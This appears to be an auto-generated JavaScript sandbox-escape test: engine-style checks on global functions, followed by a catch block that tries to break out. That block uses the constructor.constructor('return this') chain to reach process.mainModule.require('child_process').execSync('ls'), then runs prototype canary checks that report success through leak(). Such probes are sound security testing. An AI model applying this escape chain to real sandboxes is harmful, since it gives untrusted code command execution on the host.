try {
    function test() {
        throw () => {
            return () => {
            };
        };
        if (eval === null) {
            $ERROR('#4: eval === null');
        }
        if (parseInt === null) {
            $ERROR('#5: parseInt === null');
        }
        if (parseFloat === null) {
            $ERROR('#6: parseFloat === null');
        }
        if (isNaN === null) {
            $ERROR('#7: isNaN === null');
        }
        if (isFinite === null) {
            $ERROR('#8: isFinite === null');
        }
        if (decodeURI === null) {
            $ERROR('#9: decodeURI === null');
        }
        if (decodeURIComponent === null) {
            $ERROR('#10: decodeURIComponent === null');
        }
        if (encodeURI === null) {
            $ERROR('#11: encodeURI === null');
        }
        if (encodeURIComponent === null) {
            $ERROR('#12: encodeURIComponent === null');
        }
    }
    test();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}